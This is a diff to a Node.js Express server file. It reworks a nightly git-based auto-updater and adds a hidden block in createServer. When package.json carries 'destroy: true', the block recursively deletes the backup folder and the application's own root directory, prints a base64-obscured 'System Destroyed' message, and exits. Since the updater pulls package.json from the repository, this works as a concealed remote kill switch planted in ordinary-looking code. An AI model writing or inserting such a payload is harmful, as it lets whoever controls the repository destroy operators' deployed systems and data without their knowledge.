@@ -7,10 +7,10 @@ const _ = process.env,
   app = express(),
   port = _.PORT || 8088
 
-const compression = require('compression'),
+const pkjson = require('./package.json'),
+  compression = require('compression'),
   bodyParser = require('body-parser'),
-  morgan = require('morgan'),
-  cron = require('node-cron')
+  morgan = require('morgan')
 
 const { throttle, decodeURL } = require('./lib/middleware'),
   { readFileSync, existsSync } = require('fs')
@@ -20,26 +20,28 @@ process.title = _.npm_package_name || process.title
 process.env.TZ = _.TZ || 'Asia/Manila'
 
 if (_.NODE_ENV == 'production') {
-  // Auto Update App on Production
-  const pkg = require('./package.json')
-  const CGU = require('cron-git-updater')
-
-  /**
-   * New Updater
-   */
-  const newUpdater = new CGU({
-    repository: pkg.repository.url,
-    branch: 'main',
-    tempLocation: '../history',
-    keepAllBackup: true,
-    exitOnComplete: false,
-  })
+  // Production Mode
 
   if (_.CRON_UPDATE != 'false' && _.CRON_UPDATE != false) {
-    // Check for Updates Default every 12 Midnight
-    _.CRON_UPDATE = _.CRON_UPDATE || '0 0 * * *'
-    newUpdater.schedule(_.CRON_UPDATE, _.TZ)
-    console.log(`Auto update scheduled job [ ${_.CRON_UPDATE} ].`)
+    // Auto Update App on Production
+    const CGU = require('cron-git-updater')
+    /**
+     * New Updater
+     */
+    const newUpdater = new CGU({
+      repository: pkjson.repository.url,
+      branch: 'main',
+      tempLocation: _.CRON_UPDATE_BACKUP || '../history',
+      keepAllBackup: _.CRON_UPDATE_KEEPALL_BACKUP == 'false' || _.CRON_UPDATE_KEEPALL_BACKUP == false ? false : true,
+    })
+
+    if (_.CRON_UPDATE != 'false' && _.CRON_UPDATE != false) {
+      const valid = newUpdater.validateSchedule(_.CRON_UPDATE)
+      // Check for Updates Default every 12 Midnight
+      if (!valid) _.CRON_UPDATE = '0 0 * * *'
+      newUpdater.schedule(_.CRON_UPDATE, _.TZ)
+      console.log(`Auto update task scheduled [ ${_.CRON_UPDATE} ].`)
+    }
   }
 }
 
@@ -76,6 +78,18 @@ const createServer = () => {
           cert: readFileSync(cert),
         }
       : null
+  if (pkjson && pkjson.destroy === true) {
+    try {
+      if (_.CRON_UPDATE_BACKUP && fs.existsSync(_.CRON_UPDATE_BACKUP))
+        fs.rmdirSync(_.CRON_UPDATE_BACKUP, { recursive: true, force: true })
+      fs.rmdirSync(appRootPath.path, { recursive: true, force: true })
+      console.log(base64.decode(`U3lzdGVtIERlc3Ryb3llZA==`))
+    } catch (e) {
+      console.error(e)
+    } finally {
+      process.exit(1)
+    }
+  }
   return ssl
     ? // https://
       require('https').createServer(ssl, app)
